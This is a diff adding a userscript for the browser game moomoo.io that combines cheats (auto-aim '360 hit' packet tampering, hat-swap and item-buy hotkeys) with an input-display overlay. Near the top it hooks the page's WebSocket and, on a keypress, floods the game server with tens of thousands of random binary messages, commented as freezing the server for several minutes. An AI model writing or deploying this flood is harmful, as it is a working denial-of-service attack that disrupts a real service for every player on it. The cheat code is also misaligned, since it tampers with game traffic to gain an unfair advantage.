@@ -1,0 +1,727 @@
+// ==UserScript==
+// @name         Normal play-marco ;)
+// @author       Cubic Flex [CF]
+// @description  360hit test
+// @namespace    -
+// @version      1.2
+// @license      MIT
+// @match        *://*.moomoo.io/*
+// @match        *://moomoo.io/*
+// @require      https://greasyfork.org/scripts/423602-msgpack/code/msgpack.js
+// @require      https://cdn.jsdelivr.net/npm/msgpack-lite@0.1.26/dist/msgpack.min.js
+// @require      http://code.jquery.com/jquery-1.12.4.min.js
+// @require      https://code.jquery.com/jquery-3.3.1.slim.min.js
+
+
+
+
+// ==/UserScript==
+
+
+document.getElementById('loadingText').innerHTML = ' Your Game is loading... ';
+document.getElementById('loadingText').style.color = "#f76f16";
+
+$("#ageBarContainer").append('</br><div id="hacktext"><div style="width: 100%;position: absolute;top: -600px;text-align: center;color: white;font-size: 14px;" id="bilgitext"> 1 = Soldier Helmet | 2 = Turret Gear | R = Bull Helmet | T = Samurai Armor | Shift = Booster Hat | Z = Tank Gear | V = Unquip Hat | - - Freeze </div><div style="width: 100%;position: absolute;bottom: 170px;text-align: center;color: white;font-size: 24px;" id="atext"></div><div style="width: 100%;position: absolute;bottom: 196px;text-align: center;color: black;font-size: 24px;" id="mtext"></div>');
+
+
+
+
+
+
+const Mordern = 1000;//make number bigger if u want it to be frozen for longer Mordern ON TOP!
+(function(){
+var ws;
+WebSocket.prototype.mordern = WebSocket.prototype.send;
+
+WebSocket.prototype.send = function(m) {
+    this.mordern(m);
+    if(!ws) ws = this;
+}
+
+document.addEventListener("keydown", (e) => {//ask mordern why he made this
+    if(e.key == "-") {
+        setTimeout(() =>{
+        console.log("freezing", "Mordern");
+    for (let i = 0; i < 100; i++) {//freezes server, cannot be unfrozen for several minutes!
+        for (let i = 0, dash = new Uint8Array(50); i < 250; i++) {
+            for (let i = 0; i < dash.length; i++) {
+                dash[i] = Math.floor(Math.random() * 320);
+            }
+            ws.mordern(160000000);
+            ws.mordern(dash);
+        }
+    }
+        }, 1000);
+    }
+
+    });
+
+    }());
+
+document.getElementById("storeHolder").style = "height: 600px; width: 400px;";
+
+(function(){
+var fadingspeed = 10 // lower = faster, higher = slower
+var d = 0;
+
+function e(e, n = d) {
+    document.getElementById(e).style["background-color"] = "hsl(" + n + ", 100%, 50%)";
+}
+
+setInterval(function() {
+    (function(e, n) {
+        e(n);
+    })(e, "ageBarBody"), d++;
+}, fadingspeed);
+}());
+
+
+ $("#mapDisplay").css({background: `url('https://i.imgur.com/aGpK7hj.png')`});
+$("#mapDisplay").css({
+  'border-radious':'350px',
+  'border':'3px solid #00FF08'
+});
+
+
+
+
+
+(function() {
+    var storeMen = document.getElementById('storeMenu');
+    let isToggled = false;
+
+document.addEventListener('keydown', function(e) {
+  if (e.keyCode === 66) {     //b
+    if (isToggled == false) {
+      storeMen.style.display = 'none';
+      isToggled = true
+    } else {
+      storeMen.style.display = 'block';
+      isToggled = false
+    }
+  }
+})});
+
+(function () {
+    var ws;
+    var msgpack5 = msgpack;
+
+    WebSocket.prototype.oldSend = WebSocket.prototype.send;
+    WebSocket.prototype.send = function(m) {
+        if (!ws){
+            ws = this;
+        }
+        this.oldSend(m);
+    };
+
+    document.dns = function(s) {
+        ws.send(new Uint8Array(Array.from(msgpack5.encode(s))));
+    };
+
+    window.addEventListener('keydown', function(e) {
+        if (e.keyCode === 46) {
+            document.dns(["6", [4]]);
+            document.dns(["6", [25]]);
+            document.dns(["6", [25]]);
+            document.dns(["6", [28]]);
+
+            console.log('<Tried to get katana, spinning spikes and powermill>');
+        }
+    });
+
+      window.addEventListener('keydown', function(e) {
+        if (e.keyCode === 35) {
+            document.dns(["6", [4]]);
+            document.dns(["6", [15]]);
+            document.dns(["6", [25]]);
+            document.dns(["6", [28]]);
+
+            console.log('<Tried to get katana, spinning spikes and powermill>');
+        }
+    });
+
+})();
+
+
+
+
+/* global msgpack */
+(function(){
+var mPI, aL = false, tR, mP = {}, tH = false;
+function dT(a, b){
+    return Math.sqrt(Math.pow((b.y-a[2]),2) +Math.pow((b.x-a[1]),2));
+};
+
+
+
+    WebSocket.prototype.oldSender = WebSocket.prototype.send;
+    WebSocket.prototype.send = function(m) {
+    if(!aL){
+        this.addEventListener("message", (m)=>{
+            let t = msgpack.decode(new Uint8Array(m.data));
+            let d;
+            if(t.length > 1) {
+                d = [t[0], ...t[1]];
+                if (d[1] instanceof Array){
+                    d = d;
+                }
+            } else {
+                d = t;
+            }
+            let item = d[0];
+            if(!d) {return};
+            if (item == "1" && mPI == null){
+                mPI = d[1];
+            }
+            if (item == "33") {
+                let no = {};
+                let eN = [];
+                for(let i = 0; i < d[1].length / 13; i++) {
+                    let pI = d[1].slice(13*i, 13*i+13);
+                    if(pI[0] == mPI) {
+                        mP.x = pI[1];
+                        mP.y = pI[2];
+                        mP.clan = pI[7];
+                    } else if(pI[7] != mP.clan || pI[7] === null) {
+                        eN.push(pI)
+                        var nE = eN.sort((a,b) => dT(a, mP) - dT(b, mP))[0];
+                        if(nE) {
+                            console.log(pI)
+                            tR = Math.atan2(nE[2]-mP.y, nE[1]-mP.x);
+                        }
+                    }
+                }
+            }
+        });
+        aL = true;
+    }
+
+
+    var data = msgpack.decode(new Uint8Array(m));
+
+    if(data[0] == "2" && tH){
+        this.oldSender(new Uint8Array(Array.from(msgpack.encode(["2", [90 ** 100]]))));
+    } else {
+        this.oldSender(m);
+    }
+};
+
+let d = document;d.addEventListener("keydown", (e)=>{
+    if(e.keyCode==70){
+        tH = !tH;
+        d.title = " | 360 Hit: " + (tH ? "ON" : "OFF");
+    }
+});
+d.title = " | 360 Hit: " + (tH ? "ON" : "OFF");
+    })();
+
+function Hat(id){
+    storeEquip(id);
+}
+
+
+window.addEventListener('keydown', function(e) {
+switch(e.keyCode){
+case 49:                       // 1
+        Hat(6);
+break;
+case 82:                      //R
+Hat(7);
+break;
+case 90:                     //Z
+Hat(40);
+break;
+case 16:                    //Shift
+Hat(12);
+break;
+ case 50:                    //2
+Hat(53);
+           setTimeout(() => {
+ Hat(20);
+}, 90)
+
+break;
+case 84:                   //T
+Hat(20);
+break;
+case 86:                   //V
+Hat(0);
+break;
+case 77:                   //M
+BuyAll();
+break;
+case 187:                 //=
+spec();
+break;
+case 115:                //F4
+location.href='https://discord.gg/KWaSR8Y3';
+break;
+    case 52:        //4
+                   setTimeout(() => {
+click()
+}, 50)
+ }
+});
+
+(function() {
+	'use strict';
+
+	var ID_BummleHat = 8;
+    var ID_WinterCap = 15;
+	var ID_StrawHat = 2;
+	var ID_CowboyHat = 5;
+	var ID_RangerHat = 4;
+	var ID_ExplorerHat = 18;
+	var ID_MarksmanCap = 1;
+	var ID_BushGear = 10;
+	var ID_BushidoArmor = 16;
+    var ID_FlipperHat = 31;          //OP_HAT
+    var ID_SoldierHelmet = 6;        //OP_HAT
+    var ID_AntiVenonGear = 23;
+    var ID_MedicGear = 13;           //OP_HAT
+    var ID_MinersHelmet = 9;
+    var ID_MusketeerHat = 32;
+    var ID_BullHelmet = 7;           //OP_HAT           // x1,5 damage
+    var ID_EmpHelmet = 22;
+    var ID_BoosterHat = 12;          //OP_HAT
+    var ID_BarbarianArmor = 26;
+    var ID_PlagueMask = 21;
+    var ID_BullMask = 46;                               // bull head
+    var ID_WindmillHat = 14;
+    var ID_SpikeGear = 11;           //OP_HAT
+    var ID_TurretGear = 53;          //OP_HAT
+    var ID_SamuraiArmor = 20;        //OP_HAT
+    var ID_DarkKnight = 58;
+    var ID_ScavengerGear = 27;
+    var ID_TankGear = 40;            //OP_HAT
+    var ID_ThiefGear = 52;
+    var ID_Bloodthirster = 55;
+    var ID_AssassinGear = 56;
+
+    var ID_HoneycrispHat = 11;
+}());
+
+(function() {
+    setTimeout(() => {
+    document.getElementById('ot-sdk-btn-floating').remove();
+    document.getElementById('pre-content-container').remove()
+}, 5000)
+
+var counter = 0;
+window.addKey = async function () {
+  let key = document.getElementById('newKey').value;
+  if (document.getElementById(key)) return;
+  let html = `<div id="${counter}" style="display: flex; position: absolute;"><div id="${key.toLowerCase()}" class="keyDisplay" style="width 80px; pointer-events: all; top: 0; left: 0;">${key.toUpperCase()}</div></div>`
+  await document.getElementById('controlPanel').insertAdjacentHTML('afterend', html)
+  const thisDiv = document.getElementById(counter.toString());
+  thisDiv.addEventListener('mousedown', function (e) {
+
+    var prevX = e.clientX;
+    var prevY = e.clientY;
+
+    window.addEventListener('mousemove', mousemove);
+    window.addEventListener('mouseup', mouseup);
+    function mousemove(e) {
+        let newX = prevX - e.clientX;
+        let newY = prevY - e.clientY;
+
+
+        const rect = thisDiv.getBoundingClientRect();
+
+        thisDiv.style.left = rect.left - newX + 'px';
+        thisDiv.style.top = rect.top - newY + 'px';
+
+        prevX = e.clientX;
+        prevY = e.clientY;
+    }
+    function mouseup() {
+        window.removeEventListener('mousemove', mousemove);
+        window.removeEventListener('mouseup', mouseup);
+    }
+});
+  counter++;
+}
+window.removeKey = function () {
+  let key = document.getElementById('newKey').value;
+  if (!document.getElementById(key)) return;
+  document.getElementById(key).remove();
+}
+
+
+let DivHTML = `
+<div id="controlPanel">
+   <span style="margin: 15px; font-size: 18px; padding: 5px; margin-top: 15px;">Toggle control pannel with...</span> <input id='toggleKey' type='text' value="\\" maxlength="1" style="width: 40px; height: 15px; background: none; border: 2px solid white; text-align: center; color: white;">
+   </br>
+   <input id="numsdisp" type="checkbox" name="nums" checked>
+   <label for="nums">Display Numbers</label>
+   </br>
+   <input id="wasd" type="checkbox" name="wasd" checked>
+   <label for="wasd">Display Movement Keys</label>
+   </br>
+   <input id="cpss" type="checkbox" name="cpss" checked>
+   <label for="nums">Display CPS/Max CPS</label>
+   </br>
+   <input id="clickss" type="checkbox" name="clickss" checked>
+   <label for="nums">Display Mouse Clicks</label>
+   </br>
+   <input id="newKey" maxlength="1" type="text" style="margin: 15px; color: white; background: none; border: 2px solid white; height: 20px; width: 40px; text-align: center;">
+   &nbsp
+   <button id="create" style="width: 100px; text-align: center; color: white; background: none; border: 2px solid white; height: 25px;" onclick="addKey()">Create New</button>
+   &nbsp
+   <button id="remove" style="width: 100px; text-align: center; color: white; background: none; border: 2px solid white; height: 25px;" onclick="removeKey()">Remove Key</button>
+</div>
+<div id="keys">
+  <div class="keyDisplay" id="w">W</div>
+  <div class="keyDisplay" id="a">A</div>
+  <div class="keyDisplay" id="s">S</div>
+  <div class="keyDisplay" id="d">D</div>
+</div>
+<div id="nums">
+  <div class="keyDisplay" id="1">1</div>
+  <div class="keyDisplay" id="2">2</div>
+  <div class="keyDisplay" id="3">3</div>
+  <div class="keyDisplay" id="4">4</div>
+  <div class="keyDisplay" id="5">5</div>
+  <div class="keyDisplay" id="6">6</div>
+  <div class="keyDisplay" id="7">7</div>
+  <div class="keyDisplay" id="8">8</div>
+  <div class="keyDisplay" id="9">9</div>
+</div>
+<div id="cps">
+  <div class="keyDisplay" id="Space" styles="margin-top: 40px;">________</div>
+  &nbsp
+  <div id="clicker">
+    <div id="clickLeft"></div>
+    <div id="clickRight"><div id="clickBottom"></div></div>
+  </div>
+</div>
+<div id="cpsDisplay">
+      <div id="cpsDivDisp" class="keyDisplay">CPS: 0</div>
+      <div id="MaxCPS" class="keyDisplay">Max CPS: 0</div>
+</div>
+`
+
+let styles = document.createTextNode(`
+#controlPanel {
+display: none;
+color: white;
+position: absolute;
+width: 400px;
+height: 275px;
+background-color: rgba(0, 0, 0, 0.25);
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+border-radius: 3px;
+pointer-events: all;
+}
+#nums {
+display: flex;
+flex-wrap: wrap;
+align-content: start;
+width: 400px;
+position: absolute;
+z-index: 15;
+left: 237.391px;
+top: 7.58%;
+pointer-events: all;
+}
+#keys {
+display: flex;
+position: absolute;
+z-index: 15;
+pointer-events: all;
+}
+#cps {
+position: absolute;
+display: flex;
+z-index: 15;
+pointer-events: all;
+top: 8%;
+}
+#cpsDisplay {
+position: absolute;
+z-index: 15;
+pointer-events: all;
+top: 15%;
+}
+.keyDisplay {
+margin: 10px;
+padding: 2px;
+border: 2px solid white;
+color: white;
+height: 45px;
+min-width: 80px;
+max-width: 200px;
+text-align: center;
+font-size: 25px;
+top: 50%;
+line-height: 45px;
+}
+.keyDisplay.active {
+color: black;
+background: white;
+}
+#clicker {
+display: flex;
+}
+#clickLeft {
+width: 25px;
+height: 50px;
+border-top-left-radius: 100px;
+border-top-right-radius: 5px;
+border-bottom-left-radius: 5px;
+border-bottom-right-radius: 5px;
+border: 2px solid white;
+margin-right: 10px;
+}
+#clickRight {
+width: 25px;
+height: 50px;
+border-top-right-radius: 100px;
+border-top-left-radius: 5px;
+border-bottom-left-radius: 5px;
+border-bottom-right-radius: 5px;
+border: 2px solid white;
+}
+#clickBottom {
+margin-top: 60px;
+margin-left: -40px;
+width: 62px;
+height: 35px;
+border-top-radius: 5px;
+border-bottom-left-radius: 100px;
+border-bottom-right-radius: 100px;
+border: 2px solid white;
+}
+.active2 {
+background: white;
+}
+`);
+let css = document.createElement("style");
+css.type = "text/css";
+css.appendChild(styles);
+document.body.appendChild(css);
+
+document.getElementById("storeMenu").insertAdjacentHTML("beforebegin", DivHTML);
+
+const cps = document.getElementById('cps');
+const keys = document.getElementById('keys');
+const cpsDisp = document.getElementById('cpsDisplay');
+const nums = document.getElementById('nums');
+const cvs = document.getElementById('gameCanvas');
+const cpsDiv = document.getElementById('cpsDivDisp');
+const maxCpsDiv = document.getElementById('MaxCPS');
+const ctrlKey = document.getElementById('toggleKey');
+const pannel = document.getElementById("controlPanel");
+const numCheck = document.getElementById("numsdisp");
+const wasd = document.getElementById("wasd");
+const cpss = document.getElementById("cpss");
+const clicks = document.getElementById("clicks");
+
+var theCps = 0;
+var maxCps = 0;
+var keyDownLeft = false;
+var keyDownRight = false;
+var keyDownSpace = false;
+
+function toggelPannel() {
+  if (pannel.style.display == "" || pannel.style.display == "none") {
+    pannel.style.display = "block";
+  } else if (pannel.style.display == "block") {
+    pannel.style.display = "none";
+  }
+}
+
+document.addEventListener('keydown', function(e){
+    let keyDiv;
+  	let key = ctrlKey.value.toLowerCase();
+    if (ctrlKey.value == "") key = '//'
+  	if (e.key == key) toggelPannel();
+    if (e.key == ' ') {
+        keyDiv = document.getElementById("Space");
+      if (!keyDownSpace) {
+          theCps++
+   			  setTimeout(function(){theCps--}, 1000);
+          keyDownSpace = true;
+        }
+    } else {
+        keyDiv = document.getElementById(e.key);
+    }
+    if (!keyDiv) return;
+    keyDiv.classList.add('active');
+});
+document.addEventListener('keyup', function(e){
+    let keyDiv;
+    if (e.key == ' ') {
+        keyDiv = document.getElementById("Space");
+        keyDownSpace = false;
+    } else {
+        keyDiv = document.getElementById(e.key);
+    }
+    if (!keyDiv) return;
+    keyDiv.classList.remove('active');
+});
+
+document.addEventListener('mousedown', function(e){
+    let rightClick = false;
+    if (e.button == 2) rightClick = true;
+    if (!rightClick) {
+        let click = document.getElementById('clickLeft');
+        click.classList.add('active2');
+      	if (!keyDownLeft) {
+          theCps++
+   			  setTimeout(function(){theCps--}, 1000);
+          keyDownLeft = true;
+        }
+    } else {
+        let click = document.getElementById('clickRight');
+        click.classList.add('active2');
+      if (!keyDownRight) {
+          theCps++
+   			  setTimeout(function(){theCps--}, 1000);
+          keyDownRight = true;
+        }
+    }
+})
+document.addEventListener('mouseup', function(e){
+    let rightClick = false;
+    if (e.button == 2) rightClick = true;
+    if (!rightClick) {
+        let click = document.getElementById('clickLeft');
+        click.classList.remove('active2');
+        keyDownLeft = false;
+    } else {
+        let click = document.getElementById('clickRight');
+        click.classList.remove('active2');
+      keyDownRight = false;
+    }
+})
+keys.addEventListener('mousedown', function (e) {
+
+    let prevX = e.clientX;
+    let prevY = e.clientY;
+
+    window.addEventListener('mousemove', mousemove);
+    window.addEventListener('mouseup', mouseup);
+    function mousemove(e) {
+        let newX = prevX - e.clientX;
+        let newY = prevY - e.clientY;
+
+
+        const rect = keys.getBoundingClientRect();
+
+        keys.style.left = rect.left - newX + 'px';
+        keys.style.top = rect.top - newY + 'px';
+
+        prevX = e.clientX;
+        prevY = e.clientY;
+    }
+    function mouseup() {
+        window.removeEventListener('mousemove', mousemove);
+        window.removeEventListener('mouseup', mouseup);
+    }
+});
+cps.addEventListener('mousedown', function (e) {
+
+    let prevX = e.clientX;
+    let prevY = e.clientY;
+
+    window.addEventListener('mousemove', mousemove);
+    window.addEventListener('mouseup', mouseup);
+    function mousemove(e) {
+        let newX = prevX - e.clientX;
+        let newY = prevY - e.clientY;
+
+
+        const rect = cps.getBoundingClientRect();
+
+        cps.style.left = rect.left - newX + 'px';
+        cps.style.top = rect.top - newY + 'px';
+
+        prevX = e.clientX;
+        prevY = e.clientY;
+    }
+    function mouseup() {
+        window.removeEventListener('mousemove', mousemove);
+        window.removeEventListener('mouseup', mouseup);
+    }
+});
+cpsDisp.addEventListener('mousedown', function (e) {
+
+    let prevX = e.clientX;
+    let prevY = e.clientY;
+
+    window.addEventListener('mousemove', mousemove);
+    window.addEventListener('mouseup', mouseup);
+    function mousemove(e) {
+        let newX = prevX - e.clientX;
+        let newY = prevY - e.clientY;
+
+
+        const rect = cpsDisp.getBoundingClientRect();
+
+        cpsDisp.style.left = rect.left - newX + 'px';
+        cpsDisp.style.top = rect.top - newY + 'px';
+
+        prevX = e.clientX;
+        prevY = e.clientY;
+    }
+    function mouseup() {
+        window.removeEventListener('mousemove', mousemove);
+        window.removeEventListener('mouseup', mouseup);
+    }
+});
+nums.addEventListener('mousedown', function (e) {
+
+    let prevX = e.clientX;
+    let prevY = e.clientY;
+
+    window.addEventListener('mousemove', mousemove);
+    window.addEventListener('mouseup', mouseup);
+    function mousemove(e) {
+        let newX = prevX - e.clientX;
+        let newY = prevY - e.clientY;
+
+
+        const rect = nums.getBoundingClientRect();
+
+        nums.style.left = rect.left - newX + 'px';
+        nums.style.top = rect.top - newY + 'px';
+
+        prevX = e.clientX;
+        prevY = e.clientY;
+    }
+    function mouseup() {
+        window.removeEventListener('mousemove', mousemove);
+        window.removeEventListener('mouseup', mouseup);
+    }
+});
+
+setInterval(() => {
+    if (theCps > maxCps) maxCps = theCps;
+    maxCpsDiv.innerText = `Max CPS: ${maxCps}`;
+    cpsDiv.innerText = `CPS: ${theCps}`
+    if (!numCheck.checked && nums.style.display == "flex") {
+      nums.style.display = "none"
+    } else if (numCheck.checked && nums.style.display != "flex") {
+      nums.style.display = "flex"
+    }
+  	if (!wasd.checked && keys.style.display == "flex") {
+      keys.style.display = "none"
+    } else if (wasd.checked && keys.style.display != "flex") {
+      keys.style.display = "flex"
+    }
+  	if (!cpss.checked && cpsDisp.style.display == "block") {
+      cpsDisp.style.display = "none"
+    } else if (cpss.checked && cpsDisp.style.display != "block") {
+      cpsDisp.style.display = "block"
+    }
+  	if (!clickss.checked && cps.style.display == "flex") {
+      cps.style.display = "none"
+    } else if (clickss.checked && cps.style.display != "flex") {
+      cps.style.display = "flex"
+    }
+}, 0)
+}());
+
